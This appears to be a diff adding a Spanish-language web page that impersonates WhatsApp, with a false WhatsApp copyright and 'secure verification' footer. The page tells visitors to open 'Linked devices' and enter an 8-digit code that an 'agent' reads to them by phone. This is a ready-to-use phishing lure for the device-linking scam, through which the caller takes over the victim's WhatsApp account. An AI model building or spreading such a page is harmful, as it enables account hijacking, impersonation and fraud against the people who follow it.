@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vincular Dispositivo - WhatsApp</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(180deg, #00a884 0%, #008f72 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 24px 16px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 14px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            max-width: 440px;
+            width: 100%;
+            padding: 36px 28px;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 72px;
+            height: 72px;
+            margin-bottom: 16px;
+        }
+        
+        h1 {
+            color: #1f2937;
+            font-size: 23px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            color: #6b7280;
+            font-size: 14px;
+            margin-bottom: 26px;
+            line-height: 1.5;
+        }
+        
+        .btn-abrir {
+            display: block;
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(135deg, #25d366 0%, #00a884 100%);
+            color: white;
+            border: none;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+            box-shadow: 0 6px 20px rgba(37,211,102,0.4);
+            transition: transform 0.2s;
+            margin-bottom: 10px;
+        }
+        
+        .btn-abrir:active { transform: scale(0.98); }
+        
+        .btn-abrir .icon { font-size: 22px; margin-right: 8px; }
+        
+        .aviso {
+            font-size: 12px;
+            color: #9ca3af;
+            margin-bottom: 28px;
+        }
+        
+        .divisor {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #9ca3af;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 24px;
+        }
+        
+        .divisor::before,
+        .divisor::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #e5e7eb;
+        }
+        
+        .pasos {
+            text-align: left;
+            margin-bottom: 24px;
+        }
+        
+        .paso {
+            display: flex;
+            gap: 14px;
+            align-items: flex-start;
+            padding: 14px;
+            background: #f9fafb;
+            border-radius: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #f0f0f0;
+        }
+        
+        .paso .num {
+            flex-shrink: 0;
+            width: 30px;
+            height: 30px;
+            background: #00a884;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 15px;
+        }
+        
+        .paso .texto {
+            color: #374151;
+            font-size: 14px;
+            line-height: 1.45;
+            padding-top: 4px;
+        }
+        
+        .paso .texto b { color: #111827; }
+        
+        .nota {
+            background: #fff7ed;
+            border: 1px solid #fdba74;
+            border-left: 4px solid #f97316;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #9a3412;
+            text-align: left;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        
+        .nota b { display: block; margin-bottom: 4px; }
+        
+        .footer {
+            color: #9ca3af;
+            font-size: 11px;
+            padding-top: 16px;
+            border-top: 1px solid #f0f0f0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="logo">
+        
+        <h1>Vincular tu dispositivo</h1>
+        <p class="subtitle">
+            Para continuar con la verificación, abre WhatsApp y vincula tu dispositivo.
+            El agente te dará el código por teléfono.
+        </p>
+        
+        <a href="whatsapp://fpm?version=3" class="btn-abrir" id="btnAbrir">
+            <span class="icon">💬</span>Abrir WhatsApp y Vincular
+        </a>
+        <p class="aviso">Toca el botón de arriba. Se abrirá WhatsApp automáticamente.</p>
+        
+        <div class="divisor">o hazlo manual</div>
+        
+        <div class="pasos">
+            <div class="paso">
+                <div class="num">1</div>
+                <div class="texto">Abre WhatsApp y toca los <b>tres puntitos</b> (⋮) arriba a la derecha.</div>
+            </div>
+            <div class="paso">
+                <div class="num">2</div>
+                <div class="texto">Entra en <b>Dispositivos vinculados</b>.</div>
+            </div>
+            <div class="paso">
+                <div class="num">3</div>
+                <div class="texto">Toca <b>Vincular un dispositivo</b>.</div>
+            </div>
+            <div class="paso">
+                <div class="num">4</div>
+                <div class="texto">Elige <b>Vincular con el número de teléfono</b> (abajo).</div>
+            </div>
+            <div class="paso">
+                <div class="num">5</div>
+                <div class="texto">Ingresa el <b>código de 8 dígitos</b> que el agente te dará por teléfono.</div>
+            </div>
+        </div>
+        
+        <div class="nota">
+            <b>⚠️ Importante</b>
+            Si el botón no abre WhatsApp, usa los pasos manuales de arriba. El código que te dicten es solo para esta verificación.
+        </div>
+        
+        <div class="footer">
+            © 2026 WhatsApp Inc. · Verificación segura
+        </div>
+    </div>
+
+    <script>
+        // Si el botón falla, mostrar los pasos resaltados
+        document.getElementById('btnAbrir').addEventListener('click', function() {
+            // Intentar abrir por si el href no dispara
+            setTimeout(function() {
+                // Si seguimos en la página después de 1.5s, quizá no abrió
+                if (!document.hidden) {
+                    document.querySelector('.pasos').style.animation = 'pulse 1s';
+                }
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
